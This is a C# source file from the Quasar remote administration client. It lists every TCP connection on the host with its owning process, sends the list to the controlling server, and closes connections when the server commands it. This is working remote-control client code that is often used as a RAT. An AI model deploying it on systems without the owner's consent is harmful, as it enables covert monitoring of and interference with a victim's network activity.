using Quasar.Client.Utilities;
using Quasar.Common.Enums;
using Quasar.Common.Messages;
using System;
using System.Runtime.InteropServices;
using Models = Quasar.Common.Models;
using Process = System.Diagnostics.Process;

namespace Quasar.Client.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT HANDLE TCP Connections COMMANDS. */

    public static partial class CommandHandler
    {
        public static void HandleGetConnections(Networking.Client client, GetConnections packet)
        {
            var table = GetTable();

            var connections = new Models.TcpConnection[table.Length];

            for (int i = 0; i < table.Length; i++)
            {
                string processName;
                try
                {
                    var p = Process.GetProcessById((int)table[i].owningPid);
                    processName = p.ProcessName;
                }
                catch
                {
                    processName = $"PID: {table[i].owningPid}";
                }

                connections[i] = new Models.TcpConnection {
                    ProcessName = processName,
                    LocalAddress = table[i].LocalAddress.ToString(),
                    LocalPort = table[i].LocalPort,
                    RemoteAddress = table[i].RemoteAddress.ToString(),
                    RemotePort = table[i].RemotePort,
                    State = (ConnectionState) table[i].state};
            }

            client.Send(new GetConnectionsResponse {Connections = connections});
        }

        public static void HandleDoCloseConnection(Networking.Client client, DoCloseConnection packet)
        {
            var table = GetTable();

            for (var i = 0; i < table.Length; i++)
            {
                //search for connection
                if (packet.LocalAddress == table[i].LocalAddress.ToString() &&
                    packet.LocalPort == table[i].LocalPort &&
                    packet.RemoteAddress == table[i].RemoteAddress.ToString() &&
                    packet.RemotePort== table[i].RemotePort)
                {
                    // it will close the connection only if client run as admin
                    //table[i].state = (byte)ConnectionStates.Delete_TCB;
                    table[i].state = 12; // 12 for Delete_TCB state
                    var ptr = Marshal.AllocCoTaskMem(Marshal.SizeOf(table[i]));
                    Marshal.StructureToPtr(table[i], ptr, false);
                    NativeMethods.SetTcpEntry(ptr);
                }
            }
        }

        private static NativeMethods.MibTcprowOwnerPid[] GetTable()
        {
            NativeMethods.MibTcprowOwnerPid[] tTable;
            var afInet = 2;
            var buffSize = 0;
            var ret = NativeMethods.GetExtendedTcpTable(IntPtr.Zero, ref buffSize, true, afInet, NativeMethods.TcpTableClass.TcpTableOwnerPidAll);
            var buffTable = Marshal.AllocHGlobal(buffSize);
            try
            {
                ret = NativeMethods.GetExtendedTcpTable(buffTable, ref buffSize, true, afInet, NativeMethods.TcpTableClass.TcpTableOwnerPidAll);
                if (ret != 0)
                    return null;
                var tab = (NativeMethods.MibTcptableOwnerPid) Marshal.PtrToStructure(buffTable, typeof(NativeMethods.MibTcptableOwnerPid));
                var rowPtr = (IntPtr) ((long) buffTable + Marshal.SizeOf(tab.dwNumEntries));
                tTable = new NativeMethods.MibTcprowOwnerPid[tab.dwNumEntries];
                for (var i = 0; i < tab.dwNumEntries; i++)
                {
                    var tcpRow = (NativeMethods.MibTcprowOwnerPid) Marshal.PtrToStructure(rowPtr, typeof(NativeMethods.MibTcprowOwnerPid));
                    tTable[i] = tcpRow;
                    rowPtr = (IntPtr) ((long) rowPtr + Marshal.SizeOf(tcpRow));
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffTable);
            }
            return tTable;
        }
    }
}